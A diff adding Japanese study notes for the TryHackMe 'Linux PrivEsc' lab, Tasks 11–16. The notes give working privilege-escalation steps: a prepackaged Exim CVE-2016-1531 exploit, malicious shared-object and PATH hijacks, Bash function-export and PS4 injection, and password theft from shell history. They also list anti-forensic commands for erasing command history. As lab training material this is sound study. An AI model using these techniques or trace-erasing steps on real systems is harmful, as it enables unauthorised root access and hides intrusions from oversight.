@@ -2,7 +2,7 @@
 
 > **ルーム:** [Linux PrivEsc](https://tryhackme.com/room/linprivesc)
 > **学習日:** 2026-05-24 〜
-> **進捗:** Task 1〜10 完了（48%）
+> **進捗:** Task 1〜16 完了（76%）
 > **初期認証情報:** `user:password321`（SSH接続可）
 
 ---
@@ -755,9 +755,243 @@ exit
 
 ---
 
+## Task 11: SUID / SGID Executables - Known Exploits
+
+### 概要
+
+SUID/SGIDビットが設定されたバイナリを列挙し、既知の脆弱性（CVE）を持つものを特定して既製のエクスプロイトを適用する。
+
+### SUID とは
+
+SUID（Set owner User ID up on execution）が設定されたプログラムは、**誰が実行してもそのファイルの所有者（root）の権限で動作する**。パスワード変更の `passwd` コマンドが代表例。  
+裏を返せば、SUIDが付いた脆弱なバイナリは「常設されたrootへの扉」になりうる。
+
+### 手順
+
+```bash
+# SUID/SGIDが設定されたファイルを列挙
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+
+# → /usr/sbin/exim-4.84-3 が SUID(root) で存在することを確認
+
+# 既製のエクスプロイトスクリプトを実行
+/home/user/tools/suid/exim/cve-2016-1531.sh
+# sh-4.1# → root権限取得
+```
+
+### CVE-2016-1531（Exim の脆弱性）の仕組み
+
+Exim 4.84-3 は `perl_startup` 環境変数を実行時にサニタイズ（無害化）せずに読み込んでしまう欠陥がある。エクスプロイトはこの変数に「rootシェルを起動するPerlコード」を仕込み、SUID（root）で動くExim に自分の悪意あるコードを実行させる。
+
+---
+
+## Task 12: SUID / SGID Executables - Shared Object Injection
+
+### 概要
+
+SUID バイナリが**一般ユーザーの書き込み可能なディレクトリ**から共有ライブラリを読み込もうとしている設定ミスを突く。そこに悪意ある `.so` ファイルを配置してrootシェルを起動させる。
+
+### 偵察：strace でライブラリ探索の失敗を発見
+
+```bash
+strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
+
+# → open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT
+#              ↑ 一般ユーザーが書き込める場所を探している！
+```
+
+`strace` はプログラムがOSに発行するシステムコールを丸裸にするデバッグツール。`ENOENT`（ファイルなし）エラーが探索の急所を示す。
+
+### 手順
+
+```bash
+# 1. ライブラリを配置するディレクトリを作成
+mkdir /home/user/.config
+
+# 2. rootシェルを起動する悪意ある共有ライブラリをコンパイル
+gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
+
+# 3. SUID バイナリを再実行（今度は偽ライブラリが読み込まれる）
+/usr/local/bin/suid-so
+# bash-4.1# → root権限取得
+```
+
+### Task 7 との違い
+
+| 比較軸 | Task 7（LD_LIBRARY_PATH） | Task 12（Shared Object Injection） |
+|-------|--------------------------|----------------------------------|
+| 悪用する仕組み | 環境変数でライブラリ探索経路を捻じ曲げる | バイナリが元から信じ込んでいる絶対パスに偽物を置く |
+| 必要な条件 | env_keep でLD_LIBRARY_PATHが引き継がれる設定ミス | 書き込み可能な場所をバイナリが探索している |
+
+---
+
+## Task 13: SUID / SGID Executables - Environment Variables
+
+### 概要
+
+SUID バイナリが内部で**フルパスなし（相対パス）**で外部コマンドを呼び出していることを `strings` で発見し、PATHを汚染して偽のコマンドを実行させる。
+
+### 手順
+
+```bash
+# 1. バイナリの内部文字列を確認
+strings /usr/local/bin/suid-env
+# → "service apache2 start"  ← /usr/sbin/service ではなく相対パス！
+
+# 2. 同名の悪意ある実行ファイルをコンパイル
+gcc -o service /home/user/tools/suid/service.c
+
+# 3. カレントディレクトリをPATHの先頭に追加して実行
+PATH=.:$PATH /usr/local/bin/suid-env
+# root@debian:~# → root権限取得
+```
+
+### service.c のポイント：setuid(0) の必要性
+
+```c
+int main() {
+    setuid(0);           // ← これがないとbashが権限を自動的に落とす
+    system("/bin/bash -p");
+}
+```
+
+現代のbashはSUIDバイナリ経由で呼び出されると「実ユーザー ≠ 実効ユーザー」を検知して権限を一般ユーザーに落とす自己防衛機能を持つ。`setuid(0)` でその防衛を先に無力化する。
+
+### 防御側の視点
+
+外部コマンドを呼び出すプログラムでは、フルパス（`/usr/sbin/service`）を必ずハードコードする。相対パスは攻撃者がPATHを汚染するだけで悪用可能。
+
+---
+
+## Task 14: SUID / SGID Executables - Abusing Shell Features (#1)
+
+### 概要
+
+Task 13 でフルパス指定に修正された `suid-env2` を対象に、**Bash 4.2-048 未満**の「ファイルパスと同名の関数をエクスポートできる」という仕様を悪用して特権昇格する。
+
+### 手順
+
+```bash
+# 1. バイナリがフルパスを使っていることを確認
+strings /usr/local/bin/suid-env2
+# → "/usr/sbin/service apache2 start"  ← フルパス、Task 13 の対策済み
+
+# 2. Bash バージョンを確認（4.2-048 未満であることが条件）
+/bin/bash --version
+# → GNU bash, version 4.1.5  ← 脆弱なバージョン
+
+# 3. /usr/sbin/service という名前の関数を定義してエクスポート
+function /usr/sbin/service { /bin/bash -p; }
+export -f /usr/sbin/service
+
+# 4. SUID バイナリを実行
+/usr/local/bin/suid-env2
+# root@debian:~# → root権限取得
+```
+
+### 攻撃が成立する仕組み
+
+C言語の `system()` 関数は内部で `/bin/sh -c` を呼び出す。この時起動した Bash が「エクスポートされた関数一覧の中に `/usr/sbin/service` という名前がある」ことを検知し、ファイルより関数を優先実行してしまう。
+
+**教訓：** アプリケーション層のセキュアコーディングが完璧でも、実行環境（Bashのバージョン）の脆弱性一つでシステムが陥落する。視野をコード（点）からシステム全体（面）に広げること。
+
+---
+
+## Task 15: SUID / SGID Executables - Abusing Shell Features (#2)
+
+### 概要
+
+Bash のデバッグモードで使われる環境変数 `PS4` に悪意あるコマンドを埋め込み、SUID バイナリの実行時にそれをroot権限で発火させる。（Bash 4.4 以降では修正済み）
+
+### 手順
+
+```bash
+# PS4 にペイロードを仕込んでデバッグモードで SUID バイナリを実行
+env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
+
+# → 大量のデバッグ出力が流れる（PS4 が繰り返し評価・実行される）
+# → /tmp/rootbash が root 権限で生成される
+
+# SUID バックドアでrootシェルを取得
+/tmp/rootbash -p
+# rootbash-4.1# → root権限取得（euid=0）
+```
+
+### 攻撃の仕組み
+
+```
+SHELLOPTS=xtrace  → Bash デバッグモードを強制有効化
+PS4='$(command)'  → デバッグプロンプトの内容に「コマンド実行」を仕込む
+
+SUID バイナリ（root権限）が起動
+  → 内部で system() が /bin/sh を呼ぶ
+  → デバッグモードが有効なのでスクリプト1行ごとに PS4 を評価
+  → PS4 内のコマンドが root 権限で実行される
+  → /tmp/rootbash（SUID付きbash）が生成される
+```
+
+### 今回の失敗：クリーンアップの順序ミス
+
+```bash
+# ❌ 誤った順序
+rootbash-4.1# exit           # 先にrootシェルを抜ける
+user@debian:~$ rm /tmp/rootbash  # → Operation not permitted（一般ユーザーでは消せない）
+
+# ✅ 正しい順序
+rootbash-4.1# rm /tmp/rootbash   # rootのうちに消す
+rootbash-4.1# exit
+```
+
+root権限で作成したSUIDファイルは、一般ユーザー権限では削除できない。**「権限を持っているうちに、自分が作った特権ファイルを片付ける」**のが鉄則。
+
+---
+
+## Task 16: Passwords & Keys - History Files
+
+### 概要
+
+コマンドラインに直接パスワードを入力してしまった管理者の操作履歴（`.bash_history`）から認証情報を窃取し、root権限を奪取する。
+
+### 手順
+
+```bash
+# 全ての隠しファイル（history系）の内容を確認
+cat ~/.*history | less
+
+# → mysql コマンドにパスワードがそのまま記録されているのを発見
+#   mysql -h somehost.local -uroot -p[パスワード]
+
+# 発見したパスワードで root に昇格
+su root
+# root@debian:/home/user# → root権限取得
+```
+
+### 脆弱性の根源
+
+`-p` オプションの直後にパスワードを書くと（スペースなし）、ターミナルエミュレータのエコーが止まらずコマンドライン全体が `bash_history` に記録される。  
+本来は `-p` だけ書いて Enter を押し、**パスワードプロンプトに入力する**ことで履歴への記録を防げる。
+
+### 教訓：痕跡（アーティファクト）への意識
+
+| 場所 | 残る情報 |
+|-----|---------|
+| `~/.bash_history` | 全ての実行コマンド |
+| `~/.mysql_history` | MySQLセッションのクエリ履歴 |
+| `~/.nano_history` | nanoで編集したファイル名 |
+
+実戦での痕跡消去手法（参考）：
+
+```bash
+export HISTFILE=/dev/null   # セッション開始直後に履歴保存を無効化
+history -c && history -w    # メモリとファイルの履歴を両方クリア
+cat /dev/null > ~/.bash_history  # ファイルを空にする
+```
+
+---
+
 ## 次回の予定
 
-Task 11: SUID / SGID Executables - Known Exploits から再開
+Task 17: Passwords & Keys - Config Files から再開
 
 ---
 
